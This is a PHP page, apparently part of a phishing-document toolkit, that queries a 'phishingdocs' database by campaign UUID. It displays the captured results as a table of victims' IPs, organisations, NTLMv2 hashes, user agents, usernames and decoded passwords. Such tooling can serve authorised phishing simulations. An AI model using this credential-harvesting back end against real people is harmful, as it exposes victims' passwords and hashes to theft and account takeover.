<HTML>
<HEAD>
<link rel="stylesheet" href="../../main.css">
</HEAD>
<BODY>
<CENTER>
<?php

// Read Database Connection Variables
require_once '../../config.php';

$dbname = "phishingdocs";

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

?>


<?php

// Show Credentails for the Selected Project
if(isset($_REQUEST['UUID'])){
$UUID = $_REQUEST['UUID'];

$UUID = filter_var($UUID, FILTER_SANITIZE_SPECIAL_CHARS);
$UUID = mysqli_real_escape_string($conn, $UUID);

$sql = "Call GetUUIDRecord('$UUID');";
$result = $conn->query($sql);

?>
    <h2><FONT COLOR="#FFFFFF">Received Requests</FONT></h2>
<TABLE BORDER=1><TR><TH>Date/Time</TH><TH>IP</TH><TH>Target</TH><TH>Org</TH><TH>Hash</TH><TH>UserAgent</TH><TH>User</TH><TH>Pass</TH></TR>
<?php
    // output data of each row
    while($row = $result->fetch_assoc()) {
//$pw = $row["pass"];
echo "<tr><td>".$row["Datetime"]."</td><td>".$row["IP"]."</td><td>".$row["Target"]."</td><td>".$row["Org"]."</td><td>".$row["NTLMv2"]."</td><td>".$row["UA"]."</td><td>".$row['User']."</td><td>".base64_decode($row['Pass'])."</td></tr>";
    }

printf($conn->error);



$conn->close();
}
?></TABLE>
</CENTER>
</BODY>
</HTML>
